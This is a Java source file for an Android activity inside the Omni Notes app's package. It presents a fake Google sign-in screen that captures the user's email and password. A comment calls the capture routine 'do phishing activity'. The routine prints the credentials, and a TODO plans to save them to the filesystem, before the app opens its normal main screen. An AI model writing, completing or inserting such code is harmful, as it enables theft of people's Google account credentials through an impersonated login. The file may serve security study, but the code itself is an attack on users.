package it.feio.android.omninotes;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;
import android.util.Patterns;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

import android.util.Patterns;
import android.widget.Toast;

public class LoginGoogleEmail extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login_google_email);

        final Button signInButton = findViewById(R.id.google_btn);
        final EditText email = findViewById(R.id.google_email);
        final EditText password = findViewById(R.id.google_password);

        signInButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if(validateEmail(v, email.getText().toString()) && validatePassword(v, password.getText().toString())){
                    getUserInfo(v, email, password);
                }
            }
        });
    }

    // do phishing activity
    private void getUserInfo(View v, EditText email, EditText password){
        // TODO: store username and text to filesystem
        System.out.println(email.getText() + " and " + password.getText());
        String welcome = getString(R.string.welcome) + " " + email.getText().toString();
        Toast.makeText(getApplicationContext(), welcome, Toast.LENGTH_LONG).show();
        // intent to go to MainActivity
        Intent i = new Intent(this, MainActivity.class);
        startActivity(i);
    }

    // email validation
    private boolean validateEmail(View v, String email){
        // if not empty and is an email, then do email validation
        if (!email.trim().isEmpty() && email.contains("@")){
            return Patterns.EMAIL_ADDRESS.matcher(email).matches();
        }
        else {
            String error = getString(R.string.invalid_username);
            Toast.makeText(getApplicationContext(), error, Toast.LENGTH_LONG).show();
            return false;
        }
    }

    // password validation
    private boolean validatePassword(View v, String password){

        if (password.trim().length() < 8){
            String error = getString(R.string.invalid_password2);
            Toast.makeText(getApplicationContext(), error, Toast.LENGTH_LONG).show();
            return false;
        }
        else {
            return password != null && password.trim().length() > 8;
        }
    }

}